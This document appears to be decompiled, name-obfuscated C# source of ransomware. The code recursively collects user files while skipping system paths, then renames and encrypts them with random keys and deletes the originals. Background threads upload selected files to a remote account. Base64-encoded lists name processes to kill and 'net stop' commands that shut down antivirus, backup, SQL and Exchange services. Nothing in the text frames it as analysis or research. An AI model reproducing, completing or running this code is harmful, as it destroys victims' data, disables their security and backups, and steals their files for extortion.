using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using jaUgzyuTuLVRnk;

namespace VsYjhNTIRPBh;

internal class BdNzYJbFQkt
{
	public class JvwCpGzjDLhz
	{
		private static StringCollection GQaWajvDNZA = new StringCollection();

		private static List<string> PeUmNkEkpsC = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(bRWwIGxQDNUf("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".secure[milleni5000@qq.com]") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(VBnebdmzVyVM))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ebTviElysEaTK) * 1024.0 * 1024.0 && lpGWtAojVdYTD == "YES")
							{
								PeUmNkEkpsC.Add(text);
							}
							else if (File.Exists(text) && lpGWtAojVdYTD == "NO")
							{
								PeUmNkEkpsC.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return PeUmNkEkpsC;
		}
	}

	[CompilerGenerated]
	private sealed class gFziCarFKwcYA
	{
		public string RnRdOGcofxD;

		public bool _003CMain_003Eb__4(Process p)
		{
			return p.ProcessName == RnRdOGcofxD;
		}
	}

	[CompilerGenerated]
	private sealed class kTbpNXulOMt
	{
		private sealed class nlgBPpjPOdqRp
		{
			public kTbpNXulOMt BXPawvHBKNNXZs;

			public string kjGZWcgLhIZyiuR;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					nxevbysxclBn(WindowsIdentity.GetCurrent().Name, kjGZWcgLhIZyiuR);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				rgqtuHSyPjEGMh(kjGZWcgLhIZyiuR, BXPawvHBKNNXZs.pUAnRmYHngjfQ, BXPawvHBKNNXZs.LPPeeLdZOamdog, BXPawvHBKNNXZs.BWrgmJPXpOFHUvv, BXPawvHBKNNXZs.uelNwLNpmW);
			}
		}

		public string[] pUAnRmYHngjfQ;

		public string[] BWrgmJPXpOFHUvv;

		public string uelNwLNpmW;

		public string LPPeeLdZOamdog;

		public void _003CCrypt_003Eb__1d(string t)
		{
			if (ORfPBuBSaW && !GMaTMFIxjiIeHx().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						nxevbysxclBn(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (hmqxhsSApKDzHR == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rgqtuHSyPjEGMh(t, pUAnRmYHngjfQ, LPPeeLdZOamdog, BWrgmJPXpOFHUvv, uelNwLNpmW);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rgqtuHSyPjEGMh(t, pUAnRmYHngjfQ, LPPeeLdZOamdog, BWrgmJPXpOFHUvv, uelNwLNpmW);
			}
		}
	}

	[CompilerGenerated]
	private sealed class BSfgtAGCJJ
	{
		private sealed class NjKjYguZhR
		{
			public BSfgtAGCJJ RXOEgCXhAgw;

			public string bNBUkzjCfRSyzj;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in DUqqCtAuioSycsG)
				{
					if (bNBUkzjCfRSyzj.ToLower().EndsWith(item + RXOEgCXhAgw.rPyiHKpMMTJy) && WGgfEjujSrGUZq == "YES")
					{
						if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > new FileInfo(bNBUkzjCfRSyzj).Length)
						{
							try
							{
								fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", bNBUkzjCfRSyzj);
							}
							catch
							{
							}
						}
					}
					else if (bNBUkzjCfRSyzj.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "NO")
					{
						try
						{
							fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", bNBUkzjCfRSyzj);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class TNnyFlDMCBROOw
		{
			public BSfgtAGCJJ RXOEgCXhAgw;

			public string hUPniJiZVDw;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in DUqqCtAuioSycsG)
				{
					if (hUPniJiZVDw.ToLower().EndsWith(item + RXOEgCXhAgw.rPyiHKpMMTJy) && WGgfEjujSrGUZq == "YES")
					{
						if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > new FileInfo(hUPniJiZVDw).Length)
						{
							try
							{
								fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", hUPniJiZVDw);
							}
							catch
							{
							}
						}
					}
					else if (hUPniJiZVDw.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "NO")
					{
						try
						{
							fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", hUPniJiZVDw);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> eRJjXroUaRKCqq;

		public List<string> NzxACIIdqFoRm;

		public string rPyiHKpMMTJy;

		public string[] fSAMCrBuKipT;

		public string rtsMhwnvSFB;

		public void _003CWorkerCrypter2_003Eb__2a(string t1)
		{
			string bNBUkzjCfRSyzj;
			foreach (string item in NzxACIIdqFoRm)
			{
				if (fSAMCrBuKipT.Length != 0)
				{
					string[] array = fSAMCrBuKipT;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_05e6;
					}
				}
				try
				{
					if (item.EndsWith(rPyiHKpMMTJy))
					{
						goto IL_05e6;
					}
				}
				catch (Exception)
				{
					goto IL_05e6;
				}
				if (!item.EndsWith(t1) || oqWWUuhrnyOw.Contains(item))
				{
					continue;
				}
				if (BSZjxjpTZw == "YES")
				{
					try
					{
						if (IlfCoNWMBTzl.BxdCSMELkuma(item))
						{
							IlfCoNWMBTzl.SxXuDtbxCNga(item);
						}
					}
					catch
					{
					}
				}
				oqWWUuhrnyOw.Add(item);
				if (!ASgzEyFxzgQhoK.Contains(Path.GetDirectoryName(item)))
				{
					ASgzEyFxzgQhoK.Add(Path.GetDirectoryName(item));
				}
				UUzWCnDnxX(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (nmuAfqaGuDVCWu)
						{
							try
							{
								File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00e5;
					}
					if (OsMYpRNHCzj == "YES" && new FileInfo(item).Length > Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024 && !eRJjXroUaRKCqq.Contains(t1))
					{
						try
						{
							if (rPyiHKpMMTJy != ".*")
							{
								File.Move(item, item + rPyiHKpMMTJy);
							}
						}
						catch (Exception ex4)
						{
							if (nmuAfqaGuDVCWu)
							{
								try
								{
									File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						bNBUkzjCfRSyzj = "";
						if (rPyiHKpMMTJy != ".*")
						{
							bNBUkzjCfRSyzj = item + rPyiHKpMMTJy;
						}
						else
						{
							bNBUkzjCfRSyzj = item;
						}
						if (PccLrMHcmQe == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in DUqqCtAuioSycsG)
								{
									if (bNBUkzjCfRSyzj.ToLower().EndsWith(item2 + rPyiHKpMMTJy) && WGgfEjujSrGUZq == "YES")
									{
										if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > new FileInfo(bNBUkzjCfRSyzj).Length)
										{
											try
											{
												fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", bNBUkzjCfRSyzj);
											}
											catch
											{
											}
										}
									}
									else if (bNBUkzjCfRSyzj.ToLower().EndsWith(item2) && WGgfEjujSrGUZq == "NO")
									{
										try
										{
											fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", bNBUkzjCfRSyzj);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
						string s = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = goQLZKylfBJoMX.NqSyJmWMHCvpIn(bNBUkzjCfRSyzj, Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024);
						goQLZKylfBJoMX.TRVBZzkmRKRt(BadfsIMDWVvNqE: (!ifjARTnvYFXaP) ? (USpxehIBNWBw ? goQLZKylfBJoMX.CqEeuYLOGtltNm(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : goQLZKylfBJoMX.CqEeuYLOGtltNm(array3, Encoding.ASCII.GetBytes(rtsMhwnvSFB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (USpxehIBNWBw ? fqNSSLRDaIS.xnkFYMOGZg(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fqNSSLRDaIS.xnkFYMOGZg(array3, Encoding.ASCII.GetBytes(rtsMhwnvSFB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), fprCvFubCIRP: bNBUkzjCfRSyzj, DgqotAuYtuq: bytes);
					}
					else
					{
						string text2 = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
						string s2 = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (rPyiHKpMMTJy != ".*")
						{
							if (!aWqOuNoAvwwKwt)
							{
								if (!USpxehIBNWBw)
								{
									wZwIXYigPPI(item, item + rPyiHKpMMTJy, OyNQAnsoUFivGOP);
								}
								else
								{
									wZwIXYigPPI(item, item + rPyiHKpMMTJy, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!USpxehIBNWBw)
									{
										TLjaPcTldYTTzR(item, item + rPyiHKpMMTJy, OyNQAnsoUFivGOP);
									}
									else
									{
										TLjaPcTldYTTzR(item, item + rPyiHKpMMTJy, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nmuAfqaGuDVCWu)
									{
										try
										{
											File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aWqOuNoAvwwKwt)
						{
							if (!USpxehIBNWBw)
							{
								wZwIXYigPPI(item, item + ".part", OyNQAnsoUFivGOP);
							}
							else
							{
								wZwIXYigPPI(item, item + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!USpxehIBNWBw)
								{
									TLjaPcTldYTTzR(item, item, OyNQAnsoUFivGOP);
								}
								else
								{
									TLjaPcTldYTTzR(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nmuAfqaGuDVCWu)
								{
									try
									{
										File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (USpxehIBNWBw)
						{
							if (rPyiHKpMMTJy != ".*")
							{
								uplyNzshJdeZA(item + rPyiHKpMMTJy, bytes2);
							}
							else
							{
								uplyNzshJdeZA(item, bytes2);
							}
						}
					}
					goto IL_05e6;
					end_IL_00e5:;
				}
				catch (Exception)
				{
					goto IL_05e6;
				}
				continue;
				IL_05e6:
				NzxACIIdqFoRm.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string fileInfo)
		{
			if (fSAMCrBuKipT.Length != 0)
			{
				string[] array = fSAMCrBuKipT;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0676;
				}
			}
			try
			{
				if (fileInfo.EndsWith(rPyiHKpMMTJy))
				{
					goto IL_0676;
				}
			}
			catch (Exception)
			{
				goto IL_0676;
			}
			if (!oqWWUuhrnyOw.Contains(fileInfo))
			{
				if (BSZjxjpTZw == "YES")
				{
					try
					{
						if (IlfCoNWMBTzl.BxdCSMELkuma(fileInfo))
						{
							IlfCoNWMBTzl.SxXuDtbxCNga(fileInfo);
						}
					}
					catch
					{
					}
				}
				oqWWUuhrnyOw.Add(fileInfo);
				if (!ASgzEyFxzgQhoK.Contains(Path.GetDirectoryName(fileInfo)))
				{
					ASgzEyFxzgQhoK.Add(Path.GetDirectoryName(fileInfo));
				}
				UUzWCnDnxX(fileInfo);
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_010d;
						}
						goto end_IL_010d_2;
						end_IL_010d:;
					}
					catch (Exception ex2)
					{
						if (nmuAfqaGuDVCWu)
						{
							try
							{
								File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_010d_2;
					}
					if (OsMYpRNHCzj == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024)
					{
						try
						{
							if (rPyiHKpMMTJy != ".*")
							{
								File.Move(fileInfo, fileInfo + rPyiHKpMMTJy);
							}
						}
						catch (Exception ex4)
						{
							if (nmuAfqaGuDVCWu)
							{
								try
								{
									File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (rPyiHKpMMTJy != ".*")
						{
							fileInfo += rPyiHKpMMTJy;
						}
						if (PccLrMHcmQe == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in DUqqCtAuioSycsG)
								{
									if (fileInfo.ToLower().EndsWith(item + rPyiHKpMMTJy) && WGgfEjujSrGUZq == "YES")
									{
										if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "NO")
									{
										try
										{
											fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
						string s = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = goQLZKylfBJoMX.NqSyJmWMHCvpIn(fileInfo, Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024);
						goQLZKylfBJoMX.TRVBZzkmRKRt(BadfsIMDWVvNqE: (!ifjARTnvYFXaP) ? (USpxehIBNWBw ? goQLZKylfBJoMX.CqEeuYLOGtltNm(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : goQLZKylfBJoMX.CqEeuYLOGtltNm(array3, Encoding.ASCII.GetBytes(rtsMhwnvSFB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (USpxehIBNWBw ? fqNSSLRDaIS.xnkFYMOGZg(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fqNSSLRDaIS.xnkFYMOGZg(array3, Encoding.ASCII.GetBytes(rtsMhwnvSFB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), fprCvFubCIRP: fileInfo, DgqotAuYtuq: bytes);
					}
					else
					{
						string text2 = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
						string s2 = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (rPyiHKpMMTJy != ".*")
						{
							if (!aWqOuNoAvwwKwt)
							{
								if (!USpxehIBNWBw)
								{
									wZwIXYigPPI(fileInfo, fileInfo + rPyiHKpMMTJy, OyNQAnsoUFivGOP);
								}
								else
								{
									wZwIXYigPPI(fileInfo, fileInfo + rPyiHKpMMTJy, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!USpxehIBNWBw)
									{
										TLjaPcTldYTTzR(fileInfo, fileInfo + rPyiHKpMMTJy, OyNQAnsoUFivGOP);
									}
									else
									{
										TLjaPcTldYTTzR(fileInfo, fileInfo + rPyiHKpMMTJy, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nmuAfqaGuDVCWu)
									{
										try
										{
											File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aWqOuNoAvwwKwt)
						{
							if (!USpxehIBNWBw)
							{
								wZwIXYigPPI(fileInfo, fileInfo + ".part", OyNQAnsoUFivGOP);
							}
							else
							{
								wZwIXYigPPI(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!USpxehIBNWBw)
								{
									TLjaPcTldYTTzR(fileInfo, fileInfo, OyNQAnsoUFivGOP);
								}
								else
								{
									TLjaPcTldYTTzR(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nmuAfqaGuDVCWu)
								{
									try
									{
										File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (USpxehIBNWBw)
						{
							if (rPyiHKpMMTJy != ".*")
							{
								uplyNzshJdeZA(fileInfo + rPyiHKpMMTJy, bytes2);
							}
							else
							{
								uplyNzshJdeZA(fileInfo, bytes2);
							}
						}
					}
					end_IL_010d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0676;
			IL_0676:
			NzxACIIdqFoRm.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class WdZDHEHQawRmtyW
	{
		public string nORZWxgYOEVwI;

		public string vRfLpaPmWWGj;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(nORZWxgYOEVwI);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(vRfLpaPmWWGj))
					{
						File.Delete(vRfLpaPmWWGj);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string CSzqWqFZUtqvTzB = "EVET";

	public static string[] dggwRJzVfNDH;

	public static IEnumerable<DirectoryInfo> GTheLiXnicY;

	public static byte[] OyNQAnsoUFivGOP = null;

	public static DirectoryInfo TjhenSltifvRZDn;

	public static string lpGWtAojVdYTD = "NO";

	public static string ebTviElysEaTK = "100000000";

	public static List<string> jDiasrreCxZfH = new List<string>();

	public static List<string> meOWbQPoWYP = new List<string>();

	public static string PbKOLZMMGYGNDYs = "NO";

	public static string rtsMhwnvSFB = "";

	public static string UvUaislHpKJDX = "";

	public static string XbFJtbTLqw = "NO";

	public static int CRySRLWDgJvNv = 0;

	public static string BSZjxjpTZw = "NO";

	public static string uSaJKUYwOykHHna = "NO";

	public static string xcInAHeGkPUKG = "NO";

	public static string MeMSPCLjDGf = "0";

	public static string uWQlestWKm = "NO";

	public static string cKhtMQEIKSduD = "NO";

	public static string aBFIiCMeYmSkuF = "NO";

	public static string wfDodeaGqrJV = "NO";

	public static List<string> wxgoomixqBIzr = new List<string>
	{
		bRWwIGxQDNUf("bHNhc3MuZXhl"),
		bRWwIGxQDNUf("c3ZjaHN0LmV4ZQ=="),
		bRWwIGxQDNUf("Y3Jjc3MuZXhl"),
		bRWwIGxQDNUf("Y2hyb21lMzIuZXhl"),
		bRWwIGxQDNUf("ZmlyZWZveC5leGU="),
		bRWwIGxQDNUf("Y2FsYy5leGU="),
		bRWwIGxQDNUf("bXlzcWxkLmV4ZQ=="),
		bRWwIGxQDNUf("ZGxsaHN0LmV4ZQ=="),
		bRWwIGxQDNUf("b3BlcmEzMi5leGU="),
		bRWwIGxQDNUf("bWVtb3AuZXhl"),
		bRWwIGxQDNUf("c3Bvb2xjdi5leGU="),
		bRWwIGxQDNUf("Y3RmbW9tLmV4ZQ=="),
		bRWwIGxQDNUf("U2t5cGVBcHAuZXhl")
	};

	public static List<string> ASgzEyFxzgQhoK = new List<string>();

	public static string BZMQUOWyxWngfqC = "NO";

	public static string oaBHcYrtKCGH = "NO";

	public static string ECbWXbdAvzso = "NO";

	public static List<string> oqWWUuhrnyOw = new List<string>();

	public static string lvDCNjDIpDA = "NO";

	private static string hFeLnzPNroORHA = "92d57103-31c8-4248-990b-728f6ba5f132";

	public static string hmqxhsSApKDzHR = "NO";

	public static string sJYoBNXksZlWf = "NO";

	public static List<string> fvENgDPmfIX = new List<string>
	{
		bRWwIGxQDNUf("c3RhcnQgRG5zY2FjaGUgL3k="),
		bRWwIGxQDNUf("c3RhcnQgRkRSZXNQdWIgL3k="),
		bRWwIGxQDNUf("c3RhcnQgU1NEUFNSViAveQ=="),
		bRWwIGxQDNUf("c3RhcnQgdXBucGhvc3QgL3k="),
		bRWwIGxQDNUf("c3RvcCBhdnBzdXMgL3k="),
		bRWwIGxQDNUf("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBtZmV3YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBEZWZXYXRjaCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBjY0V2dE1nciAveQ=="),
		bRWwIGxQDNUf("c3RvcCBjY1NldE1nciAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTYXZSb2FtIC95"),
		bRWwIGxQDNUf("c3RvcCBSVFZzY2FuIC95"),
		bRWwIGxQDNUf("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		bRWwIGxQDNUf("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBZb29CYWNrdXAgL3k="),
		bRWwIGxQDNUf("c3RvcCBZb29JVCAveQ=="),
		bRWwIGxQDNUf("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		bRWwIGxQDNUf("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		bRWwIGxQDNUf("c3RvcCBWU05BUFZTUyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCB2ZWVhbSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		bRWwIGxQDNUf("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBBY3JTY2gyU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		bRWwIGxQDNUf("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBzb3Bob3MgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		bRWwIGxQDNUf("c3RvcCBJSVNBZG1pbiAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		bRWwIGxQDNUf("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		bRWwIGxQDNUf("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		bRWwIGxQDNUf("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		bRWwIGxQDNUf("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		bRWwIGxQDNUf("c3RvcCBTYW1TcyAveQ=="),
		bRWwIGxQDNUf("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		bRWwIGxQDNUf("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		bRWwIGxQDNUf("c3RvcCBQT1AzU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		bRWwIGxQDNUf("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		bRWwIGxQDNUf("c3RvcCBTTVRQU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		bRWwIGxQDNUf("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		bRWwIGxQDNUf("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		bRWwIGxQDNUf("c3RvcCBTc3RwU3ZjIC95"),
		bRWwIGxQDNUf("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
